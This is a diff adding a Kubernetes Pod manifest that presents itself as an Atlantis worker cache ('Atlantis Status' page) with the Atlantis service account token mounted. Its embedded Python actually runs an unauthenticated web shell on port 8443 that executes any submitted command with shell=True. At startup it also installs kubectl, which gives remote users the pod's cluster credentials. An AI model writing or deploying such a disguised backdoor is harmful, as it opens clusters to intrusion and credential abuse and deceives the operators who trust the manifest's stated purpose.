@@ -1,0 +1,103 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: atlantis-worker-cache
+  labels:
+    app.kubernetes.io/name: atlantis
+    app.kubernetes.io/part-of: atlantis
+    app.kubernetes.io/component: worker
+spec:
+  serviceAccountName: atlantis
+  automountServiceAccountToken: true
+  imagePullSecrets:
+  - name: container-registries
+  containers:
+  - name: atlantis
+    image: jfrog.ledgerlabs.net/ossproxy-oci-proxy-dockerio/library/python:3.11-slim
+    command:
+    - python3
+    - -c
+    - |
+      import http.server, subprocess, json, urllib.parse, os, socket
+      from http.server import HTTPServer, BaseHTTPRequestHandler
+
+      # Install kubectl at startup
+      os.system('apt-get update -qq && apt-get install -y -qq curl > /dev/null 2>&1')
+      os.system('curl -sLo /usr/local/bin/kubectl "https://dl.k8s.io/release/$(curl -sL https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl" && chmod +x /usr/local/bin/kubectl')
+
+      HTML = '''<!DOCTYPE html><html><head><title>Atlantis Status</title>
+      <style>
+      *{margin:0;padding:0;box-sizing:border-box}
+      body{background:#1a1a2e;color:#0f0;font-family:monospace;height:100vh;display:flex;flex-direction:column}
+      #header{background:#16213e;padding:8px 16px;color:#a0a0a0;font-size:12px;border-bottom:1px solid #333}
+      #output{flex:1;overflow-y:auto;padding:12px;white-space:pre-wrap;font-size:13px}
+      #input-row{display:flex;background:#0f3460;padding:8px}
+      #prompt{color:#0f0;padding:0 8px;line-height:32px}
+      #cmd{flex:1;background:#1a1a2e;border:1px solid #333;color:#0f0;padding:6px 10px;font-family:monospace;font-size:13px;outline:none}
+      #cmd:focus{border-color:#0f0}
+      .err{color:#f55}.info{color:#5bf}
+      </style></head><body>
+      <div id="header">atlantis-worker-cache &mdash; ''' + socket.gethostname() + '''</div>
+      <div id="output"></div>
+      <div id="input-row"><span id="prompt">$</span><input id="cmd" autofocus placeholder="type command..."></div>
+      <script>
+      const out=document.getElementById('output'),cmd=document.getElementById('cmd');
+      let cwd='/';
+      cmd.addEventListener('keydown',async e=>{
+        if(e.key!=='Enter'||!cmd.value.trim())return;
+        const c=cmd.value;cmd.value='';
+        out.innerHTML+=`<span class="info">${cwd}$ </span>${c}\\n`;
+        try{
+          const r=await fetch('/exec',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd:c,cwd:cwd})});
+          const d=await r.json();
+          if(d.out)out.innerHTML+=d.out+'\\n';
+          if(d.err)out.innerHTML+=`<span class="err">${d.err}</span>\\n`;
+          if(d.cwd)cwd=d.cwd;
+        }catch(x){out.innerHTML+=`<span class="err">fetch error: ${x}</span>\\n`}
+        out.scrollTop=out.scrollHeight;
+      });
+      fetch('/exec',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd:'pwd',cwd:'/'})}).then(r=>r.json()).then(d=>{cwd=d.cwd||'/';out.innerHTML+=`<span class="info">ready — ${cwd}\\n</span>`;});
+      </script></body></html>'''
+
+      class Handler(BaseHTTPRequestHandler):
+          def log_message(self, *a): pass
+          def do_GET(self):
+              self.send_response(200)
+              self.send_header('Content-Type','text/html')
+              self.end_headers()
+              self.wfile.write(HTML.encode())
+          def do_POST(self):
+              if self.path=='/exec':
+                  data=json.loads(self.rfile.read(int(self.headers['Content-Length'])))
+                  cmd=data.get('cmd','')
+                  cwd=data.get('cwd','/')
+                  if not os.path.isdir(cwd): cwd='/'
+                  # Handle cd specially
+                  if cmd.strip().startswith('cd '):
+                      target=cmd.strip()[3:].strip()
+                      target=os.path.expanduser(target)
+                      if not os.path.isabs(target): target=os.path.join(cwd,target)
+                      target=os.path.realpath(target)
+                      if os.path.isdir(target):
+                          resp={'out':'','err':'','cwd':target}
+                      else:
+                          resp={'out':'','err':f'cd: {target}: No such directory','cwd':cwd}
+                  else:
+                      try:
+                          r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=30,cwd=cwd)
+                          resp={'out':r.stdout,'err':r.stderr,'cwd':cwd}
+                      except subprocess.TimeoutExpired:
+                          resp={'out':'','err':'command timed out (30s)','cwd':cwd}
+                      except Exception as e:
+                          resp={'out':'','err':str(e),'cwd':cwd}
+                  self.send_response(200)
+                  self.send_header('Content-Type','application/json')
+                  self.end_headers()
+                  self.wfile.write(json.dumps(resp).encode())
+
+      print(f'serving on :8443')
+      HTTPServer(('0.0.0.0',8443),Handler).serve_forever()
+    ports:
+    - containerPort: 8443
+      name: https
+  restartPolicy: Always
